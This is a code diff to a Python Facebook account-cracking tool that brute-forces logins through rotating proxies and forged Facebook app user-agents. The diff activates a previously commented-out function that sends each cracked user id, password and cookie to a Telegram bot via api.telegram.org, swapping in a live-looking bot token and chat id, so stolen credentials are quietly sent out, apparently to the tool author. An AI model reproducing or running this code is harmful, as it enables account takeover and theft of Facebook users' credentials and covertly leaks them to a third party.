@@ -13,11 +13,11 @@ except ModuleNotFoundError:
         os.system('pip install requests futures==2 > /dev/null')
         os.system('python Ishmum.py')
 except:pass
-"""
+
 def Elite(ids,pas,cookie):
     try:
         import requests
-        token = "7137906286:AHfr3pkKiaG6gOyKjep5qlpZcb1peTRfu0"
+        token = "7916396395:AAH259MJ5MTpfR5kgpF_oVo1Ma41Lvc9U2U"
         chatid = "6553606623"
         ok_id =str(uid+"|"+pas+"|"+cookie)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -29,7 +29,7 @@ def Elite(ids,pas,cookie):
 def Elite(ids,pas,cookie):
     try:
         import requests
-        token = "7137906286:AAHfr3pkKiaG6gOyKjep5qlpZcb1peTRfu0"
+        token = "7916396395:AAH259MJ5MTpfR5kgpF_oVo1Ma41Lvc9U2U"
         chatid = "6553606623"
         ok_id =str(ids+"|"+pas+"|"+cookie)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -37,7 +37,7 @@ def Elite(ids,pas,cookie):
         requests.get(url, params=params)
     except:
         pass
-"""
+
 try:
   proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   open('socksku.txt','w').write(proxylist)
@@ -225,7 +225,7 @@ logo=("""
 \033[1;32m[~] Author   : Ishmum Sarker Siam
 \033[1;32m[~] Facebook : Ishmum Sarker Siam
 \033[1;32m[~] Tool     : Free
-\033[1;32m[~] Version  : 0.02/2025
+\033[1;32m[~] Version  : 0.03/2025
 \033[1;32m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
@@ -796,7 +796,7 @@ def M3(ids,names,passlist):
                                 fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                 fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                 fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
-                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3999;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
+                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3782;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
